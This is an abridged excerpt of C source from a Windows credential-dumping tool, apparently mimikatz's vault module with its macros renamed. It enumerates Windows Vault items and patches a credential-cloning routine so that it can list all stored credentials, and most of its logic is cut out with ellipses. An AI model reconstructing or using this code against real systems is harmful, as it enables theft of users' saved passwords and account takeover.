...
const KUHL_M_C kuhl_m_c_vault[] = {
	{kuhl_m_vault_list,	L"list",	L""},
	{kuhl_m_vault_cred,	L"cred",	L""},
};
			...
			for(i = 0; i < cbVaults; i++)
			{
				...
				if(NT_SUCCESS(VaultOpenVault(&vaults[i], 0, &hVault)))
				{
					...
					if(NT_SUCCESS(VaultEnumerateItems(hVault, 0x200, &cbItems, &items))) // for all :)
					{
						...
						for(j = 0; j < cbItems; j++)
						{
							if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) // to fix !
							{
...
void kuhl_m_vault_list_descVault(HANDLE hVault)
{
	...
	RtlZeroMemory(&information, sizeof(VAULT_INFORMATION));
	information.type = (MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8) ? VaultInformation_Path_7 : VaultInformation_Path_8;
	if(NT_SUCCESS(VaultGetInformation(hVault, 0, &information)))
	{
...
NTSTATUS kuhl_m_vault_cred(int argc, wchar_t * argv[])
{
	...
	{
		if(CredpCloneCredentialReference = kull_m_patch_getGenericFromBuild(CredpCloneCredentialReferences, ARRAYSIZE(CredpCloneCredentialReferences), MEMEDOGZ_NT_BUILD_NUMBER))
		{
	...
	else
	{
		do
		{
			...
			flags++;
		} while((flags <= CRED_ENUMERATE_ALL_CREDENTIALS) && (MEMEDOGZ_NT_MAJOR_VERSION > 5));
	}
	return STATUS_SUCCESS;
}
